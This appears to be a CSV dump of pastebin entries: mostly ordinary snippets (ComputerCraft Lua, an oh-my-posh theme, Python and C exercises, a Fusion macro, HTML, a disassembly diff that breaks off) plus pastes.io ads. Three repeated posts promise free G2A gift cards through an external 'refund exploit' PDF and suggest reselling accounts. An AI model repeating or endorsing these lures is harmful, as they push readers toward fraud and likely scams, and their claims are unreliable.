id,title,username,language,date,content
HgEHeuwA,Computer Craft - Elevator Client,DiamondDeveloper,Lua,Sunday 17th of March 2024 01:01:03 AM CDT,"local monitor = peripheral.wrap(""back"")

rednet.open(""top"")

local function ota_update(text)
  local file = fs.open(""update.lua"", ""w"")
  file.write(text)
  file.close()
end"
yYfaJyXd,Oh-my-posh prompt,fhumayun,JSON,Sunday 17th of March 2024 12:21:10 AM CDT,"{
  ""$schema"": ""https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json"",
  ""blocks"": [
    {
      ""alignment"": ""left"",
      ""newline"": true,
      ""segments"": [
        {
          ""background"": ""#0c7bbb"",
          ""foreground"": ""#ffffff"",
          ""leading_diamond"": ""\u256d\u2500\ue0b2"",
          ""properties"": {
            ""alpine"": ""\uf300"",
            ""arch"": ""\uf303"",
            ""centos"": ""\uf304"",
            ""debian"": ""\uf306"",
            ""elementary"": ""\uf309"",
            ""fedora"": ""\uf30a"",
            ""gentoo"": ""\uf30d"",
            ""linux"": ""\ue712"",
            ""macos"": ""\ue711"",
            ""manjaro"": ""\uf312"",
            ""mint"": ""\uf30f"",
            ""opensuse"": ""\uf314"",
            ""raspbian"": ""\uf315"",
            ""ubuntu"": ""\uf31c"",
            ""windows"": ""\ue70f""
          },
          ""style"": ""diamond"",
          ""template"": "" {{ if .WSL }}\ue712 on {{ end }}{{ .Icon }}  "",
          ""type"": ""os""
        },
        {
          ""background"": ""#DA627D"",
          ""foreground"": ""#ffffff"",
          ""powerline_symbol"": ""\ue0b0"",
          ""style"": ""diamond"",
          ""template"": "" üè†  "",
          ""type"": ""text""
        },
        {
          ""background"": ""#8a62da"",
          ""foreground"": ""#ffffff"",
          ""powerline_symbol"": ""\ue0b0"",
          ""properties"": {
            ""style"": ""folder""
          },
          ""style"": ""powerline"",
          ""template"": "" {{ .Path }} "",
          ""type"": ""path""
        },
        {
	  ""foreground"": ""#ffffff"",
	  ""background"": ""#013220"",
          ""powerline_symbol"": ""\ue0b0"",
          ""style"": ""diamond"",
          ""template"": "" üêç  "",
          ""type"": ""text""
        },
	{
	  ""type"": ""python"",
	  ""style"": ""powerline"",
	  ""foreground"": ""#ffffff"",
	  ""background"": ""#013220"",
	  ""properties"": {
	    ""template"": ""$pyenv_version""
	  }
	},
        {
          ""background"": ""#191f48"",
          ""foreground"": ""#43CCEA"",
          ""style"": ""powerline"",
          ""powerline_symbol"": ""\ue0b0"",
          ""foreground_templates"": [
            ""{{ if or (.Working.Changed) (.Staging.Changed) }}#FF9248{{ end }}"",
            ""{{ if and (gt .Ahead 0) (gt .Behind 0) }}#ff4500{{ end }}"",
            ""{{ if gt .Ahead 0 }}#B388FF{{ end }}"",
            ""{{ if gt .Behind 0 }}#B388FF{{ end }}""
          ],
          ""properties"": {
            ""branch_max_length"": 25,
            ""fetch_stash_count"": true,
            ""fetch_status"": true,
            ""fetch_upstream_icon"": true
          },
          ""template"": "" {{ .UpstreamIcon }}{{ .HEAD }}{{if .BranchStatus }} {{ .BranchStatus }}{{ end }}{{ if .Working.Changed }} \uf044 {{ .Working.String }}{{ end }}{{ if and (.Working.Changed) (.Staging.Changed) }} |{{ end }}{{ if .Staging.Changed }} \uf046 {{ .Staging.String }}{{ end }}{{ if gt .StashCount 0 }} \ueb4b {{ .StashCount }}{{ end }} "",
          ""trailing_diamond"": ""\ue0b4"",
          ""type"": ""git""
        }
      ],
      ""type"": ""prompt""
    },
    {
      ""alignment"": ""right"",
      ""segments"": [
        {
          ""foreground"": ""#81ff91"",
          ""style"": ""diamond"",
          ""template"": ""<#cc7eda> \u007C </><#7eb8da>RAM:</> {{ (div ((sub .PhysicalTotalMemory .PhysicalFreeMemory)|float64) 1073741824.0) }}/{{ (div .PhysicalTotalMemory 1073741824.0) }}GB"",
          ""type"": ""sysinfo""
        },
        {
          ""foreground"": ""#81ff91"",
          ""properties"": {
            ""fetch_version"": true
          },
          ""style"": ""powerline"",
          ""template"": ""<#cc7eda> \u007C </><#7eb8da>\ue718</> {{ if .PackageManagerIcon }}{{ .PackageManagerIcon }} {{ end }}{{ .Full }}"",
          ""type"": ""node""
        },
        {
          ""type"": ""php"",
          ""style"": ""powerline"",
          ""foreground"": ""#81ff91"",
          ""template"": ""<#cc7eda> \u007C </><#7eb8da>\ue73d</> {{ .Full }}""
        },
        {
          ""type"": ""npm"",
          ""style"": ""powerline"",
          ""foreground"": ""#81ff91"",
          ""template"": ""<#cc7eda> \u007C </><#7eb8da>\ue71e </> {{ .Full }}""
        },
        {
          ""type"": ""sysinfo"",
          ""style"": ""powerline"",
          ""foreground"": ""#81ff91"",
          ""template"": ""<> </>""
        },
        {
          ""background"": ""#cecece"",
          ""foreground"": ""#4b4b4b"",
          ""leading_diamond"": ""\ue0b2"",
          ""trailing_diamond"": ""\ue0b0"",
          ""properties"": {
            ""style"": ""austin"",
            ""threshold"": 150
          },
          ""style"": ""diamond"",
          ""template"": ""‚åõ  {{ .FormattedMs }} "",
          ""type"": ""executiontime""
        },
        {
          ""background"": ""#cecece"",
          ""foreground"": ""#4b4b4b"",
          ""leading_diamond"": ""\ue0b2"",
          ""properties"": {
            ""time_format"": ""15:04:05""
          },
          ""style"": ""diamond"",
          ""template"": ""‚è∞  {{ .CurrentDate | date .Format }} "",
          ""trailing_diamond"": ""\ue0b0"",
          ""type"": ""time""
        }
      ],
      ""type"": ""prompt""
    },
    {
      ""alignment"": ""left"",
      ""newline"": true,
      ""segments"": [
        {
          ""foreground"": ""#0c7bbb"",
          ""style"": ""plain"",
          ""template"": ""\u2570\u2500"",
          ""type"": ""text""
        }
      ],
      ""type"": ""prompt""
    }
  ],
  ""final_space"": true,
  ""version"": 2
}
"
Nx9LezP2,Untitled,Proshenzit,Python,Sunday 17th of March 2024 12:18:21 AM CDT,"def  outer_function():
  num =20
  def inner_function():
    global num
    num = 7
  print(""before  calling inner_function"",num)
  inner_function()
  print(""after calling inner_function"",num)
outer_function()
print(""outside  both fucntion "",num)
"
bmzAWSHY,ü§ë G2A.com Free Gift Card Guide Mar 2024 FIX ü§ë,ounnuo,GetText,Sunday 17th of March 2024 12:12:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_818218.pdf

Working as of:
17 March 2024"
exzqj1Ta,End credit dots,marcusa3000,Lua,Sunday 17th of March 2024 12:04:15 AM CDT,"{
	Tools = ordered() {
		Text1_1 = TextPlus {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				GlobalOut = Input { Value = 78, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				UseFrameFormatSettings = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				LayoutRotation = Input { Value = 1, },
				TransformRotation = Input { Value = 1, },
				Overlap1 = Input { Value = 0, },
				Level1 = Input { Value = 1, },
				ExtendHorizontal1 = Input { Value = -0.1258, },
				Softness1 = Input { Value = 1, },
				StyledText = Input { Value = ""Margo\nEve\nAddison DeWitt\nKaren\nBill Simpson\nLloyd Richards\nMax Fabian\nPhoebe\nMiss Casswell\nBirdie\nAbed Actor"", },
				Font = Input { Value = ""Helvetica Neue"", },
				Style = Input { Value = ""Bold"", },
				VerticalJustificationNew = Input { Value = 3, },
				HorizontalLeftCenterRight = Input { Value = -1, },
				HorizontalJustificationNew = Input { Value = 3, },
			},
			ViewInfo = OperatorInfo { Pos = { -2035, -412.5 } },
		},
		MultiMerge1 = MultiMerge {
			Inputs = {
				LayerOrder = Input { Value = ScriptVal { {
							[0] = 1,
							2,
							3
						} }, },
				Background = Input {
					SourceOp = ""ChannelBooleans4"",
					Source = ""Output"",
				},
				[""Layer1.Foreground""] = Input {
					SourceOp = ""Transform3_1"",
					Source = ""Output"",
				},
				LayerName1 = Input { Value = ""Transform3_1 Layer"", },
				[""Layer2.Foreground""] = Input {
					SourceOp = ""Instance_Transform3_1"",
					Source = ""Output"",
				},
				LayerName2 = Input { Value = ""Instance_Transform3_1 Layer"", },
				[""Layer3.Foreground""] = Input {
					SourceOp = ""Instance_ErodeDilate1_19"",
					Source = ""Output"",
				},
				LayerName3 = Input { Value = ""BrightnessContrast1_19 Layer"", },
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -49.5 } },
		},
		BrightnessContrast1_21 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Alpha = Input { Value = 1, },
				High = Input { Value = 0.222, },
				ClipBlack = Input { Value = 1, },
				ClipWhite = Input { Value = 1, },
				Input = Input {
					SourceOp = ""ErodeDilate1_19"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -148.5 } },
		},
		Instance_ErodeDilate1_19 = ErodeDilate {
			SourceOp = ""ErodeDilate1_19"",
			Inputs = {
				SettingsNest = Input { },
				XAmount = Input {
					Value = 0.003717,
					Expression = ""-ErodeDilate1_19.XAmount""
				},
				Input = Input {
					SourceOp = ""BrightnessContrast1_21"",
					Source = ""Output"",
				},
				CommentsNest = Input { },
				FrameRenderScriptNest = Input { },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
				EffectMask = Input { }
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -115.5 } },
		},
		Instance_Text1_2 = TextPlus {
			CtrlWZoom = false,
			SourceOp = ""Text1_1"",
			Inputs = {
				SettingsNest = Input { },
				ImageNest = Input { },
				[""Gamut.ColorSpaceNest""] = Input { },
				[""Gamut.GammaSpaceNest""] = Input { },
				Layout = Input { },
				LayoutRotation = Input { Value = 1, },
				Background = Input { },
				TransformTransform = Input { },
				CharacterSpacing = Input { Value = 1.048, },
				TransformRotation = Input { Value = 1, },
				TransformShear = Input { },
				TransformSize = Input { },
				Properties1 = Input { },
				Softness1 = Input { Value = 1, },
				Position1 = Input { },
				Rotation1 = Input { },
				Shear1 = Input { },
				Size1 = Input { },
				TextText = Input { },
				StyledText = Input { Value = ""..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n..................................................\n.................................................."", },
				HorizontalLeftCenterRight = Input { },
				TabSpacing = Input { },
				AdvancedFontControls = Input { },
				Internal = Input { },
				CommentsNest = Input { Value = 0, },
				FrameRenderScriptNest = Input { Value = 0, },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
				EffectMask = Input {
					SourceOp = ""BrightnessContrast1_22"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -214.5 } },
		},
		BrightnessContrast1_22 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Alpha = Input { Value = 1, },
				Low = Input { Value = 0.9997, },
				ClipBlack = Input { Value = 1, },
				ClipWhite = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Instance_ErodeDilate1_20"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -280.5 } },
		},
		Instance_ErodeDilate1_20 = ErodeDilate {
			SourceOp = ""ErodeDilate1_20"",
			Inputs = {
				EffectMask = Input { },
				SettingsNest = Input { },
				XAmount = Input {
					Value = -0.0112,
					Expression = ""-ErodeDilate1_20.XAmount+Offset""
				},
				Input = Input {
					SourceOp = ""ErodeDilate1_20"",
					Source = ""Output"",
				},
				CommentsNest = Input { },
				FrameRenderScriptNest = Input { },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
				Offset = Input { Value = 0.005, }
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -313.5 } },
			UserControls = ordered() {
				Offset = {
					LINKS_Name = ""Offset"",
					LINKID_DataType = ""Number"",
					INPID_InputControl = ""SliderControl"",
					INP_Default = 0,
					INP_Integer = false,
					INP_MinScale = -1,
					INP_MaxScale = 1,
					ICS_ControlPage = ""Controls"",
				}
			}
		},
		ErodeDilate1_20 = ErodeDilate {
			Inputs = {
				Filter = Input { Value = 3, },
				XAmount = Input { Value = 0.0162, },
				Input = Input {
					SourceOp = ""Merge14"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -346.5 } },
		},
		ErodeDilate1_19 = ErodeDilate {
			Inputs = {
				XAmount = Input { Value = -0.003717, },
				Input = Input {
					SourceOp = ""Instance_Text1_2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -181.5 } },
		},
		DirectionalBlur1 = DirectionalBlur {
			Inputs = {
				Length = Input { Value = 0.015, },
				Angle = Input { Value = 135, },
				Input = Input {
					SourceOp = ""MultiMerge1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1815, 16.5 } },
		},
		ChannelBooleans4 = ChannelBoolean {
			Inputs = {
				Operation = Input { Value = 12, },
				Background = Input {
					SourceOp = ""Background_15"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1980, 16.5 } },
		},
		Merge14 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Transform3_1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Instance_Transform3_1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1870, -379.5 } },
		},
		Transform3_1 = Transform {
			Inputs = {
				Center = Input { Value = { 0.0316608996458087, 0.5 }, },
				Input = Input {
					SourceOp = ""Text1_1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -2035, -247.5 } },
		},
		Instance_Text1_1 = TextPlus {
			SourceOp = ""Text1_1"",
			Inputs = {
				SettingsNest = Input { },
				ImageNest = Input { },
				[""Gamut.ColorSpaceNest""] = Input { },
				[""Gamut.GammaSpaceNest""] = Input { },
				Layout = Input { },
				LayoutRotation = Input { Value = 1, },
				Background = Input { },
				TransformTransform = Input { },
				TransformRotation = Input { Value = 1, },
				TransformShear = Input { },
				TransformSize = Input { },
				Properties1 = Input { },
				Softness1 = Input { Value = 1, },
				Position1 = Input { },
				Rotation1 = Input { },
				Shear1 = Input { },
				Size1 = Input { },
				TextText = Input { },
				StyledText = Input { Value = ""Bette Davis\nAnne Baxter\nGeorge Sanders\nCeleste Holm\nGary Merrill\nHugh Marlowe\nGregory Ratoff\nBarbara Bates\nMarilyn Monroe\nThelma Ritter\nWalter Hampden"", },
				HorizontalLeftCenterRight = Input { Value = 1, },
				TabSpacing = Input { },
				AdvancedFontControls = Input { },
				Internal = Input { },
				CommentsNest = Input { },
				FrameRenderScriptNest = Input { },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
				EffectMask = Input { }
			},
			ViewInfo = OperatorInfo { Pos = { -1705, -412.5 } },
		},
		Instance_Transform3_1 = Transform {
			SourceOp = ""Transform3_1"",
			Inputs = {
				SettingsNest = Input { },
				TransformNest = Input { },
				InvertTransform = Input { Value = 1, },
				ReferenceSize = Input { },
				Input = Input {
					SourceOp = ""Instance_Text1_1"",
					Source = ""Output"",
				},
				CommentsNest = Input { },
				FrameRenderScriptNest = Input { },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
				EffectMask = Input { }
			},
			ViewInfo = OperatorInfo { Pos = { -1705, -247.5 } },
		},
		BrightnessContrast1_20 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Alpha = Input { Value = 1, },
				High = Input { Value = 0.028, },
				Input = Input {
					SourceOp = ""DirectionalBlur1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, 82.5 } },
		},
		ChannelBooleans4_1 = ChannelBoolean {
			Inputs = {
				MultiplyByMask = Input { Value = 1, },
				ToRed = Input { Value = 15, },
				ToGreen = Input { Value = 15, },
				ToBlue = Input { Value = 15, },
				ToAlpha = Input { Value = 4, },
				Background = Input {
					SourceOp = ""Background_15"",
					Source = ""Output"",
				},
				EffectMask = Input {
					SourceOp = ""BrightnessContrast1_20"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1870, 115.5 } },
		},
		Background_15 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 78, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.339, },
				TopLeftGreen = Input { Value = 0.339, },
				TopLeftBlue = Input { Value = 0.339, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0 }, },
				End = Input { Value = { 0.5, 1 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
			},
			ViewInfo = OperatorInfo { Pos = { -2035, 148.5 } },
		},
		Merge15 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""ChannelBooleans4_1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""MultiMerge1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1705, 148.5 } },
		},
		Merge13 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background_15"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Merge15"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1870, 181.5 } },
		}
	}
}"
HBF26j17,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Sunday 17th of March 2024 12:01:29 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
17 March 2024















































"
sJ3gYuZU,status_monitor.lua,Erdioner,Lua,Saturday 16th of March 2024 11:27:06 PM CDT,"local logger = require(""logger"")

local devices = {}
local monitor = peripheral.find(""monitor"")

local HEARTBEAT_TIMEOUT_MS = 10000

local unresponsiveColor = colors.red
local responsiveColor = colors.green
if not monitor.isColor() then
    unresponsiveColor = colors.gray
    responsiveColor = colors.white
end

local function updateMonitor()
    logger.log(logger.DEBUG, ""Updating monitor for "" .. #devices .. "" devices"")

    monitor.clear()
    monitor.setTextColor(colors.white)
    monitor.setCursorPos(1, 1)
    monitor.write(""Device status"")

    local now = os.epoch(""utc"")
    local i = 1
    for _, device in pairs(devices) do
        monitor.setCursorPos(1, i + 1)
        if device.lastHeartbeat < now - HEARTBEAT_TIMEOUT_MS then
            monitor.setTextColor(unresponsiveColor)
            monitor.write(device.name ..
                "": "" .. device.status .. "" ("" .. math.floor((now - device.lastHeartbeat) / 1000) .. ""s)"")
        else
            monitor.setTextColor(responsiveColor)
            monitor.write(device.name .. "": "" .. device.status)
        end

        i = i + 1
    end
end

local function requestHeartbeat()
    logger.log(logger.DEBUG, ""Requesting heartbeat from devices"")
    for _, device in pairs(devices) do
        rednet.send(device.id, os.time(), ""request_heartbeat"")
    end
end

local function updateStatus(id, message)
    devices[message.deviceName] = {
        id = id,
        status = message.status,
        name = message.deviceName,
        tags = message.tags,
        lastHeartbeat = os.epoch(""utc"")
    }
end

local function updateHeartbeat(id, _)
    logger.log(logger.DEBUG, ""Received heartbeat from "" .. id)

    local heartbeatTime = os.epoch(""utc"")
    for _, device in pairs(devices) do
        if device.id == id then
            device.lastHeartbeat = heartbeatTime
            return
        end
    end
end

local function processMessage(id, message, protocol)
    if protocol == ""status"" then
        updateStatus(id, message)
    elseif protocol == ""heartbeat"" then
        updateHeartbeat(id, message)
    end
end

local function main()
    logger.log(logger.INFO, ""Setting up status monitor"")
    if not fs.exists(""/config/status_monitor.cfg"") then
        logger.log(logger.ERROR, ""No configuration file found"")
        return
    end

    local file = fs.open(""/config/status_monitor.cfg"", ""r"")
    local config = textutils.unserialize(file.readAll())
    file.close()

    rednet.open(config.modem)

    logger.log(logger.INFO, ""Starting status monitor"")

    while true do
        local senderId, message, protocol = rednet.receive(nil, 1)

        if senderId == nil then
            requestHeartbeat()
        else
            processMessage(senderId, message, protocol)
        end

        updateMonitor()
    end
end

main()
"
8uDPZh0w,Pastes.io - New Pastebin,xxsa,PHP,Saturday 16th of March 2024 11:20:35 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
ErbGXB9X,ü§ë G2A.com Free Gift Card Guide Mar 2024 ü§ë,luckysw,GetText,Saturday 16th of March 2024 11:07:18 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
  
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
 
Working as of:
17 March 2024
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 "
X1m1aVM2,sss,kaka440ka,GetText,Saturday 16th of March 2024 10:51:49 PM CDT,"sd
ss
sss
sssssssssssssssss
ss
s
s
s
s
s
s
s
s"
zMxZp9UW,s,x2w,GetText,Saturday 16th of March 2024 10:47:47 PM CDT,"sssss
s
ssss
s
s
s
s
s
s
s
s
"
hbkJn1jg,Drag and Drop,thiago_db,PHP,Saturday 16th of March 2024 10:45:02 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
<meta charset=""UTF-8"">
<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
<title>Arrastar e Soltar com Bootstrap e TinyMCE</title>
<link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
<script src=""https://cdn.tiny.cloud/1/no-api-key/tinymce/5/tinymce.min.js"" referrerpolicy=""origin""></script>
<style>
  .sidebar {
    width: 200px;
    height: 100%;
    background-color: #f0f0f0;
    float: right;
    padding: 20px;
  }
  .draggable {
    cursor: move;
    margin-bottom: 10px;
    display: block;
  }
  .content {
    padding: 20px;
    min-height: 300px;
    position: relative;
  }
  .dropzone {
    min-height: 50px;
    border: 2px dashed #aaa;
    margin-bottom: 20px;
    position: relative;
  }
  .highlight {
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    left: 0;
    background-color: rgba(0, 0, 0, 0.1);
    border: 2px dashed #007bff;
    z-index: 1;
    display: none;
  }
  .dropzone:hover .highlight {
    display: block;
  }
  .delete-button {
    position: absolute;
    top: 5px;
    right: 5px;
    cursor: pointer;
    display: none;
  }
  .alert:hover .delete-button {
    display: block;
  }
  .red-button {
    position: absolute;
    top: 5px;
    right: 35px;
    cursor: pointer;
    background-color: red;
    color: white;
    border: none;
    padding: 5px 10px;
    border-radius: 5px;
    display: none;
  }
  .alert:hover .red-button {
    display: block;
  }
  .duplicate-button {
    position: absolute;
    top: -30px;
    right: 5px;
    cursor: pointer;
    background-color: green;
    color: white;
    border: none;
    padding: 5px 10px;
    border-radius: 5px;
    display: none;
    z-index: 1;
  }
  .alert:hover .duplicate-button {
    display: block;
  }
</style>
</head>
<body>

<div class=""container-fluid"">
  <div class=""row"">
    <div class=""col-md-3 sidebar"">
      <button class=""btn btn-secondary draggable mt-2"" draggable=""true"" ondragstart=""drag(event, 'menu')"">
        <img src=""https://via.placeholder.com/20"" alt=""Menu Icon""> Menu
      </button>
      <button class=""btn btn-secondary draggable mt-2"" draggable=""true"" ondragstart=""drag(event, 'header')"">
        <img src=""https://via.placeholder.com/20"" alt=""Header Icon""> Header
      </button>
      <button class=""btn btn-secondary draggable mt-2"" draggable=""true"" ondragstart=""drag(event, 'content')"">
        <img src=""https://via.placeholder.com/20"" alt=""Content Icon""> Content
      </button>
      <button class=""btn btn-secondary draggable mt-2"" draggable=""true"" ondragstart=""drag(event, 'footer')"">
        <img src=""https://via.placeholder.com/20"" alt=""Footer Icon""> Footer
      </button>
    </div>
    <div class=""col-md-9"">
      <div class=""content"" ondrop=""drop(event)"" ondragover=""allowDrop(event)"">
        <div class=""dropzone"">
          <div class=""highlight""></div>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
async function drop(event) {
    event.preventDefault();
    var type = event.dataTransfer.getData(""text"");
    var content = """";

      template = {
        ""menu"": './assets/img/block/content/content-1.html',
        ""header"": './assets/img/block/content/content-2.html',
        ""content"": './assets/img/block/content/content-3.html',
        ""footer"": './assets/img/block/content/content-4.html'
    }Ôªø

    content = await loadHtmlFile(template[type]);


  
   
  
}

function duplicateBlock(originalBlock) {
  var newBlock = originalBlock.cloneNode(true);
  var deleteButton = newBlock.querySelector('.delete-button');
  deleteButton.onclick = function() {
    if (confirm(""Tem certeza que deseja deletar este bloco?"")) {
      newBlock.remove();
    }
  };
  var redButton = newBlock.querySelector('.red-button');
  redButton.onclick = function() {
    if (confirm(""Tem certeza que deseja deletar este bloco?"")) {
      newBlock.remove();
    }
  };
  document.querySelector('.content').appendChild(newBlock);
}
</script>

</body>
</html>
"
aJydpBZK,Pastes.io - New Pastebin,xxsa,PHP,Saturday 16th of March 2024 10:37:07 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
vZBpyw0T,pattern,Divyansh_Chourey,C,Saturday 16th of March 2024 10:36:23 PM CDT,"#include<stdio.h>

int main(){
	int rows, columns;
	printf(""Enter the rows and columns: "");
	scanf(""%d %d"", &rows, &columns);
	
	if((rows%2 == 0) || (columns%2 == 0)){
	printf(""invalid"");}
	else{
	for(int j=1; j<=(rows/2); j++){
		for(int i=1; i<=(columns/2); i++){
			printf(""1"");
		}
		printf(""0"");
		for(int i=1; i<=(columns/2); i++){
			printf(""1"");
		}
		printf(""\n"");
	}
	for(int i=1; i<=(columns); i++){
			printf(""0"");
		}
	printf(""\n"");
	for(int j=1; j<=(rows/2); j++){
		for(int i=1; i<=(columns/2); i++){
			printf(""1"");
		}
		printf(""0"");
		for(int i=1; i<=(columns/2); i++){
			printf(""1"");
		}
		printf(""\n"");
	}
	}
	
	return 0;
}
/*OUTPUT:
Enter the rows and columns: 5 5
11011
11011
00000
11011
11011
*/"
RvksW1y4,Untitled,Kurausukun,Diff,Saturday 16th of March 2024 09:49:00 PM CDT,"--- /dev/fd/63	2024-03-16 22:48:24.353047496 -0400
+++ /dev/fd/62	2024-03-16 22:48:24.353047496 -0400
@@ -1,5 +1,5 @@
 
-tools/asmdiff/.bins/baserom.nds.o62.sbin:     file format binary
+build/overlay62.sbin:     file format binary
 
 
 Disassembly of section .data:
@@ -16,7 +16,7 @@
  2232788:	9105      	str	r1, [sp, #20]
  223278a:	90be      	str	r0, [sp, #760]	@ 0x2f8
  223278c:	2000      	movs	r0, #0
- 223278e:	9010      	str	r0, [sp, #64]	@ 0x40
+ 223278e:	900e      	str	r0, [sp, #56]	@ 0x38
  2232790:	ae99      	add	r6, sp, #612	@ 0x264
  2232792:	1c01      	adds	r1, r0, #0
  2232794:	2307      	movs	r3, #7
@@ -105,279 +105,280 @@
  2232842:	2066      	movs	r0, #102	@ 0x66
  2232844:	f7fe ff24 	bl	0x2231690
  2232848:	aa16      	add	r2, sp, #88	@ 0x58
- 223284a:	4b96      	ldr	r3, [pc, #600]	@ (0x2232aa4)
- 223284c:	1c05      	adds	r5, r0, #0
+ 223284a:	4b94      	ldr	r3, [pc, #592]	@ (0x2232a9c)
+ 223284c:	900f      	str	r0, [sp, #60]	@ 0x3c
  223284e:	cb03      	ldmia	r3!, {r0, r1}
- 2232850:	1c17      	adds	r7, r2, #0
